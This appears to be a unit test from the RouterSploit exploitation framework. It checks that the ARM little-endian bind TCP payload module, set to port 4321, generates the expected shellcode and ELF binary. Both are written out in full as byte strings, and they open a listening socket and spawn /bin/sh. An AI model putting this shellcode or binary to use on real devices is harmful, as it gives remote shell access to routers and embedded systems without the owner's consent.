from routersploit.modules.payloads.armle.bind_tcp import Exploit


# armle bind tcp payload with rport=4321
bind_tcp = (
    b"\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d"
    b"\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0"
    b"\x8d\xe2\x00\x60\xa0\xe1\xe1\x10\xa0\xe3\x10\x70\xa0\xe3\x01"
    b"\x1c\xa0\xe1\x07\x18\x81\xe0\x02\x10\x81\xe2\x02\x20\x42\xe0"
    b"\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x07\x00\x2d"
    b"\xe9\x02\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0"
    b"\x8d\xe2\x06\x00\xa0\xe1\x03\x00\x2d\xe9\x04\x00\xa0\xe3\x0d"
    b"\x10\xa0\xe1\x66\x00\x90\xef\x08\xd0\x8d\xe2\x06\x00\xa0\xe1"
    b"\x01\x10\x41\xe0\x02\x20\x42\xe0\x07\x00\x2d\xe9\x05\x00\xa0"
    b"\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60"
    b"\xa0\xe1\x02\x10\xa0\xe3\x06\x00\xa0\xe1\x3f\x00\x90\xef\x01"
    b"\x10\x51\xe2\xfb\xff\xff\x5a\x04\x10\x4d\xe2\x02\x20\x42\xe0"
    b"\x2f\x30\xa0\xe3\x62\x70\xa0\xe3\x07\x34\x83\xe0\x69\x70\xa0"
    b"\xe3\x07\x38\x83\xe0\x6e\x70\xa0\xe3\x07\x3c\x83\xe0\x2f\x40"
    b"\xa0\xe3\x73\x70\xa0\xe3\x07\x44\x84\xe0\x68\x70\xa0\xe3\x07"
    b"\x48\x84\xe0\x73\x50\xa0\xe3\x68\x70\xa0\xe3\x07\x54\x85\xe0"
    b"\x3e\x00\x2d\xe9\x08\x00\x8d\xe2\x00\x10\x8d\xe2\x04\x20\x8d"
    b"\xe2\x0b\x00\x90\xef"
)

# elf armle bind tcp
elf_armle_bind_tcp = (
    b"\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x80\x00\x00\x34\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01"
    b"\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x80\x00\x00\x00\x80\x00\x00\x58\x01\x00\x00\x5c\x02\x00"
    b"\x00\x07\x00\x00\x00\x00\x10\x00\x00\x02\x00\xa0\xe3\x01\x10"
    b"\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d"
    b"\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1"
    b"\xe1\x10\xa0\xe3\x10\x70\xa0\xe3\x01\x1c\xa0\xe1\x07\x18\x81"
    b"\xe0\x02\x10\x81\xe2\x02\x20\x42\xe0\x06\x00\x2d\xe9\x0d\x10"
    b"\xa0\xe1\x10\x20\xa0\xe3\x07\x00\x2d\xe9\x02\x00\xa0\xe3\x0d"
    b"\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x06\x00\xa0\xe1"
    b"\x03\x00\x2d\xe9\x04\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90"
    b"\xef\x08\xd0\x8d\xe2\x06\x00\xa0\xe1\x01\x10\x41\xe0\x02\x20"
    b"\x42\xe0\x07\x00\x2d\xe9\x05\x00\xa0\xe3\x0d\x10\xa0\xe1\x66"
    b"\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x02\x10\xa0\xe3"
    b"\x06\x00\xa0\xe1\x3f\x00\x90\xef\x01\x10\x51\xe2\xfb\xff\xff"
    b"\x5a\x04\x10\x4d\xe2\x02\x20\x42\xe0\x2f\x30\xa0\xe3\x62\x70"
    b"\xa0\xe3\x07\x34\x83\xe0\x69\x70\xa0\xe3\x07\x38\x83\xe0\x6e"
    b"\x70\xa0\xe3\x07\x3c\x83\xe0\x2f\x40\xa0\xe3\x73\x70\xa0\xe3"
    b"\x07\x44\x84\xe0\x68\x70\xa0\xe3\x07\x48\x84\xe0\x73\x50\xa0"
    b"\xe3\x68\x70\xa0\xe3\x07\x54\x85\xe0\x3e\x00\x2d\xe9\x08\x00"
    b"\x8d\xe2\x00\x10\x8d\xe2\x04\x20\x8d\xe2\x0b\x00\x90\xef"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.rport = 4321

    assert payload.generate() == bind_tcp
    assert payload.generate_elf(bind_tcp) == elf_armle_bind_tcp
